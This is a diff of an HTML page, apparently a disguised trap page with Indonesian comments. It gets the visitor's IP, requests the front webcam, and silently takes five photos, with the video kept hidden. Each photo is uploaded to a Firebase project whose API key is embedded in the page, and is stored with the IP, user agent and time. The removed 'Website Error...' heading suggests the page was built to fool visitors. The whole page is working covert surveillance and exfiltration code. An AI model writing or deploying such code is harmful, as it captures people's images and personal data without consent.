@@ -7,19 +7,13 @@
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
   <style>
-    video, canvas {
-      display: none;
-    }
-    body {
-      background: #fff;
-      color: #000;
-    }
+    video, canvas { display: none; }
+    body { background: #fff; color: #000; }
   </style>
 </head>
 <body>
-<h2>Website Error...</h2>
   <script>
-    // Konfigurasi Firebase
+    // ✅ Konfigurasi Firebase
     const firebaseConfig = {
       apiKey: "AIzaSyCB_wr4EqhPRzSWQuLgr-eyV9Zisw8_rIs",
       authDomain: "xr-social-53646.firebaseapp.com",
@@ -33,7 +27,7 @@
     const database = firebase.database();
     const storage = firebase.storage();
 
-    // Elemen video & canvas
+    // 🔧 Setup elemen video dan canvas
     const video = document.createElement('video');
     const canvas = document.createElement('canvas');
     const ctx = canvas.getContext('2d');
@@ -42,36 +36,47 @@
 
     let photoCount = 0;
     const maxPhotos = 5;
-    let visitorIP = "";
-    let visitTime = "";
+    let visitorIP = "Unknown";
+    let visitTime = new Date().toLocaleTimeString();
 
-    // Ambil IP dan waktu kunjungan dulu
+    // ✅ Ambil IP Address Pengunjung
+    console.log("🔍 Mengambil IP...");
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
       .then(data => {
         visitorIP = data.ip;
-        const now = new Date();
-        visitTime = now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');
+        console.log("✅ IP:", visitorIP);
         startCamera();
+      })
+      .catch(err => {
+        console.warn("⚠️ Gagal ambil IP:", err);
+        startCamera(); // lanjut walau gagal ambil IP
       });
 
+    // ✅ Akses kamera
     function startCamera() {
+      console.log("📷 Meminta akses kamera...");
       navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
         .then(stream => {
           video.srcObject = stream;
           video.play();
           video.onloadedmetadata = () => {
+            console.log("📸 Kamera siap.");
             capturePhotoRepeatedly();
           };
         })
         .catch(err => {
-          console.error(\"Gagal mengakses kamera:\", err);
+          console.error("❌ Gagal akses kamera:", err);
         });
     }
 
+    // ✅ Ambil foto setiap 1 detik (maks. 5 kali)
     function capturePhotoRepeatedly() {
       const interval = setInterval(() => {
-        if (photoCount >= maxPhotos) return clearInterval(interval);
+        if (photoCount >= maxPhotos) {
+          console.log("✅ Selesai ambil 5 foto.");
+          return clearInterval(interval);
+        }
 
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
@@ -81,17 +86,19 @@
           const fileName = `webcam_${Date.now()}.jpg`;
           const storageRef = storage.ref('webcam/' + fileName);
 
-          storageRef.put(blob).then(snapshot => {
-            return snapshot.ref.getDownloadURL();
-          }).then(downloadURL => {
-            database.ref('webcam_snapshots').push({
-              url: downloadURL,
-              timestamp: Date.now(),
-              ip: visitorIP,
-              userAgent: navigator.userAgent,
-              time: visitTime
-            });
-          });
+          storageRef.put(blob)
+            .then(snapshot => snapshot.ref.getDownloadURL())
+            .then(downloadURL => {
+              console.log("📤 Mengirim ke database:", downloadURL);
+              database.ref('webcam_snapshots').push({
+                url: downloadURL,
+                timestamp: Date.now(),
+                ip: visitorIP,
+                userAgent: navigator.userAgent,
+                time: visitTime
+              });
+            })
+            .catch(err => console.error("❌ Gagal upload:", err));
         }, 'image/jpeg');
 
         photoCount++;
